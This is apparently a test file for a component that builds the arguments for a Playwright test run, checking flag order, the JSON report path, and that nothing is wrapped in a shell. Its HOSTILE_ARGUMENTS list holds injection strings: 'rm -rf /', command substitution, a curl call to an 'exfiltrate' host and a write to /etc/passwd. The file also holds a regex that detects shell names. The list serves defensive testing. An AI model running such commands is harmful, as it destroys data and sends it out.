// suiteArguments(suite, outputDirectory) builds what the suite's process is started with: the
// declared command, unchanged and as separate strings, then Revisum's own arguments, which the
// declaration may not set: --retries=0 (a pass is a first-time pass), the JSON reporter, traces
// on and one --project per declared project. Its environment points PLAYWRIGHT_JSON_OUTPUT_NAME
// into Revisum's output directory. Revisum's arguments come after the declared ones, so they win
// over whatever the team's own Playwright config says. No argument is ever read by a shell.
// See docs/specs/SPEC-35-evidence-mode.md.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { suiteArguments } from '@revisum/engine';
import { declaredCheckoutSuite } from './evidence-examples.ts';

// Where the suite's output directory appears to the suite's process.
const OUTPUT_DIRECTORY = '/revisum-output';
const HOSTILE_ARGUMENTS = ['; rm -rf /', '$(id)', '`id`', '&& curl http://exfiltrate.invalid', '| tee /etc/passwd'];

type BuiltArguments = { readonly argv: readonly string[]; readonly environment: Readonly<Record<string, string>> };

// The argument vector and environment suiteArguments builds. The environment may come as a
// name-to-value record or as a list of { name, value } entries; both read the same here.
function built(fields: Readonly<Record<string, unknown>> = {}): BuiltArguments {
  const value: unknown = suiteArguments(declaredCheckoutSuite(fields), OUTPUT_DIRECTORY);
  assert.ok(typeof value === 'object' && value !== null, 'suiteArguments returned nothing');
  const argv: unknown = Reflect.get(value, 'argv');
  const environment: unknown = Reflect.get(value, 'environment');
  assert.ok(Array.isArray(argv) && argv.every((word) => typeof word === 'string'), `argv is not a list of strings: ${JSON.stringify(argv)}`);
  const entries: [string, string][] = [];
  if (Array.isArray(environment)) {
    for (const entry of environment) {
      const name: unknown = Reflect.get(entry, 'name');
      const text: unknown = Reflect.get(entry, 'value');
      if (typeof name === 'string' && typeof text === 'string') entries.push([name, text]);
    }
  } else if (typeof environment === 'object' && environment !== null) {
    for (const [name, text] of Object.entries(environment)) if (typeof text === 'string') entries.push([name, text]);
  }
  return { argv, environment: Object.fromEntries(entries) };
}

// The projects the argument vector selects, written either as "--project=name" or "--project name".
function selectedProjects(argv: readonly string[]): string[] {
  const projects: string[] = [];
  argv.forEach((word, index) => {
    if (word.startsWith('--project=')) projects.push(word.slice('--project='.length));
    else if (word === '--project') projects.push(argv[index + 1] ?? '');
  });
  return projects;
}

const DECLARED_COMMAND = ['npx', 'playwright', 'test'];

test('the argument vector starts with the declared command, unchanged', { criterion: 'AC-SPEC-35-12' }, () => {
  assert.deepEqual(built().argv.slice(0, DECLARED_COMMAND.length), DECLARED_COMMAND);
});

for (const argument of ['--retries=0', '--reporter=json', '--trace=on']) {
  test(`the argument vector holds ${argument}, after every declared argument`, { criterion: 'AC-SPEC-35-12' }, () => {
    const { argv } = built();
    const at = argv.indexOf(argument);
    assert.ok(at >= DECLARED_COMMAND.length, `${argument} is missing or comes before the declared command ends: ${JSON.stringify(argv)}`);
  });
}

test('no other retries, reporter or trace setting is passed beside Revisum\'s own', { criterion: 'AC-SPEC-35-12' }, () => {
  const { argv } = built();
  assert.deepEqual(argv.filter((word) => /^--retries\b/.test(word)), ['--retries=0']);
  assert.deepEqual(argv.filter((word) => /^--reporter\b/.test(word)), ['--reporter=json']);
  assert.deepEqual(argv.filter((word) => /^--trace\b/.test(word)), ['--trace=on']);
});

test('one --project is passed for each declared project, and no other', { criterion: 'AC-SPEC-35-12' }, () => {
  assert.deepEqual(selectedProjects(built({ projects: ['chromium', 'firefox'] }).argv), ['chromium', 'firefox']);
  // The counter-example: with one declared project, one is selected.
  assert.deepEqual(selectedProjects(built().argv), ['chromium']);
});

test('the JSON report is pointed into Revisum\'s output directory', { criterion: 'AC-SPEC-35-12' }, () => {
  const reportPath = built().environment['PLAYWRIGHT_JSON_OUTPUT_NAME'];
  assert.ok(reportPath !== undefined, 'PLAYWRIGHT_JSON_OUTPUT_NAME is not set');
  assert.ok(reportPath.startsWith(`${OUTPUT_DIRECTORY}/`), `the report goes to ${reportPath}`);
  assert.ok(!reportPath.slice(OUTPUT_DIRECTORY.length).split('/').includes('..'), `the report path leaves the output directory: ${reportPath}`);
});

test('declared arguments that look like shell syntax pass through as separate, literal strings', { criterion: 'AC-SPEC-35-12' }, () => {
  const { argv } = built({ command: [...DECLARED_COMMAND, ...HOSTILE_ARGUMENTS] });
  assert.deepEqual(argv.slice(0, DECLARED_COMMAND.length + HOSTILE_ARGUMENTS.length), [...DECLARED_COMMAND, ...HOSTILE_ARGUMENTS]);
});

test('the argument vector never wraps the command in a shell', { criterion: 'AC-SPEC-35-12' }, () => {
  const { argv } = built({ command: [...DECLARED_COMMAND, ...HOSTILE_ARGUMENTS] });
  const shells = /(^|\/)(sh|bash|dash|zsh|cmd|cmd\.exe|powershell|pwsh)$/;
  assert.ok(!argv.some((word) => shells.test(word)), `a shell is in the argument vector: ${JSON.stringify(argv)}`);
  assert.ok(!argv.includes('-c'), JSON.stringify(argv));
  // Each hostile argument appears once, whole, never joined into a longer command line.
  for (const argument of HOSTILE_ARGUMENTS) {
    assert.deepEqual(argv.filter((word) => word.includes(argument)), [argument], `${argument} was joined: ${JSON.stringify(argv)}`);
  }
});
